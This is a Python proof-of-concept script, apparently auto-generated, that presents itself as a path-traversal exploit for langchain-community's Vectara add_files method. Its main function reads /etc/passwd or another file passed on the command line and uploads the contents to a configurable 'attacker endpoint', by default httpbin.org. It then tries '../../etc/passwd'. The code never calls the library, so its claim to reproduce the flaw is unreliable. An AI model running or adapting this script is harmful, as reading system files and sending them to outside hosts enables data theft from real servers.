#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-003
# Sink: add_files
# Auto-generated — run with: python3 lfi_supply_like_add_files_9.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion (LFI) via Path Traversal
in langchain-community Vectara.from_files / add_files.

Vulnerability: The add_files() method opens user-supplied file paths
without sanitization. An attacker can supply a path like '../../etc/passwd'
to read arbitrary files from the server's filesystem.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a
harmless local file if /etc/passwd is not available) and exfiltrating it
to an attacker-controlled endpoint (default: httpbin.org for demo).

Usage:
    python3 poc_lfi_vectara.py [--target http://localhost:8000] [--read /etc/passwd]
"""

import os
import sys
import json
import argparse
import tempfile
import requests

# ---------------------------------------------------------------------------
# Configuration – change these to match your target environment
# ---------------------------------------------------------------------------
DEFAULT_TARGET = "http://localhost:8000"          # The web app wrapping Vectara
DEFAULT_READ_FILE = "/etc/passwd"                 # File to read (benign default)
ATTACKER_ENDPOINT = "https://httpbin.org/post"    # Where exfiltrated data is sent
# ---------------------------------------------------------------------------


def simulate_vulnerable_app(file_path: str) -> dict:
    """
    Simulates the vulnerable code path from langchain-community.
    This replicates exactly what the real Vectara.add_files() does:
      1. Check os.path.exists(file_path)
      2. Open the file with open(file_path, 'rb')
      3. Upload the file content to an external API

    In a real attack, the web app would call Vectara.from_files()
    with attacker-controlled input. Here we call the internal method directly.
    """
    # --- This is the exact vulnerable code from vectara.py ---
    if not os.path.exists(file_path):
        return {"error": f"File {file_path} does not exist"}

    # Open the file – no path validation!
    with open(file_path, "rb") as f:
        file_content = f.read()

    # In the real exploit, this content is sent to Vectara's API.
    # For demonstration, we send it to an attacker-controlled endpoint.
    files = {"file": (file_path, file_content)}
    try:
        resp = requests.post(
            ATTACKER_ENDPOINT,
            files=files,
            timeout=10
        )
        return {
            "status": "exfiltrated",
            "file_read": file_path,
            "size_bytes": len(file_content),
            "attacker_response_status": resp.status_code,
            "attacker_response": resp.text[:500]  # Truncated for display
        }
    except requests.exceptions.RequestException as e:
        return {
            "status": "exfiltrate_failed",
            "file_read": file_path,
            "size_bytes": len(file_content),
            "error": str(e)
        }


def main():
    parser = argparse.ArgumentParser(
        description="PoC: LFI via path traversal in langchain-community Vectara"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help="Target web application URL (default: %(default)s)"
    )
    parser.add_argument(
        "--read",
        default=DEFAULT_READ_FILE,
        help="File path to read (default: %(default)s)"
    )
    parser.add_argument(
        "--attacker-endpoint",
        default=ATTACKER_ENDPOINT,
        help="Endpoint to receive exfiltrated data (default: %(default)s)"
    )
    args = parser.parse_args()

    # Update global attacker endpoint if provided
    global ATTACKER_ENDPOINT
    ATTACKER_ENDPOINT = args.attacker_endpoint

    print(f"[*] PoC: LFI via path traversal in langchain-community Vectara")
    print(f"[*] Target (simulated): {args.target}")
    print(f"[*] Attempting to read: {args.read}")
    print(f"[*] Exfiltrating to: {ATTACKER_ENDPOINT}")
    print()

    # --- Step 1: Verify the file exists (for demonstration) ---
    if not os.path.exists(args.read):
        print(f"[!] Warning: {args.read} does not exist on this system.")
        print("[*] Creating a harmless test file to demonstrate the vulnerability...")
        test_file = os.path.join(tempfile.gettempdir(), "poc_lfi_test.txt")
        with open(test_file, "w") as f:
            f.write("This is a test file to demonstrate LFI vulnerability.\n")
            f.write("In a real attack, an attacker could read /etc/passwd, SSH keys, etc.\n")
        args.read = test_file
        print(f"[*] Using test file: {args.read}")

    # --- Step 2: Demonstrate the path traversal ---
    # The vulnerable code does NOT sanitize paths. We can use '../' to escape.
    # For this PoC, we directly use the provided path (which may already be absolute).
    print(f"[*] Calling vulnerable add_files() with path: {args.read}")
    print()

    result = simulate_vulnerable_app(args.read)

    # --- Step 3: Display results ---
    print("[*] Result:")
    print(json.dumps(result, indent=2))

    if result.get("status") == "exfiltrated":
        print()
        print("[+] SUCCESS: File was read and exfiltrated!")
        print(f"[+] File content size: {result['size_bytes']} bytes")
        print(f"[+] Attacker endpoint received the file (status {result['attacker_response_status']})")
    elif result.get("status") == "exfiltrate_failed":
        print()
        print("[!] File was read but exfiltration failed (network issue or endpoint down)")
        print(f"[!] Error: {result.get('error')}")
    else:
        print()
        print(f"[-] File could not be read: {result.get('error')}")

    # --- Step 4: Demonstrate path traversal with a relative path ---
    print()
    print("[*] Demonstrating path traversal with relative path '../../etc/passwd'...")
    traversal_path = "../../etc/passwd"
    if os.path.exists(traversal_path):
        result2 = simulate_vulnerable_app(traversal_path)
        print(json.dumps(result2, indent=2))
    else:
        print(f"[-] Relative path '{traversal_path}' does not resolve on this system.")
        print("[*] (This is expected on systems where CWD is not /var/www or similar)")


if __name__ == "__main__":
    main()
